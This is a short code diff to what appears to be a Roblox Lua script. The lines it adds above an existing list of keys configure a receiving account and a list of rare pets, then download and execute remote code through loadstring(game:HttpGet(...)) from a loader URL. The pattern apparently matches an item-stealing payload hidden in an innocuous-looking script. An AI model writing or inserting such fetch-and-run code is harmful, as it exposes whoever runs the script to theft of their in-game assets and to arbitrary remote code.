@@ -1,3 +1,21 @@
+script_key = "nuTNFtTiBVxcMASZyRpAeoAlHRAPFoLJ";
+getgenv().Config = {
+    MainReceive = {"kaldtemigchop"},
+    petList = {
+        ["Secret"] = {
+            { Name = "Avernus" },
+        },
+        ["normalPets"] = {
+            { Name = "Jackpot", Shiny = true, Mythic = true },
+        }
+    }
+}
+
+task.spawn(function()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/793674f6bc0a80e1c748fd75994d1607.lua"))()
+end)
+task.wait(120)
+
 local keys = {  -- Add as many key
     "eaIXeLOWoOSaFfRVnmFtpRtBVygJzyIR",
     "BORMYVfnWfvzAatItdackJJIjGBURdFD",
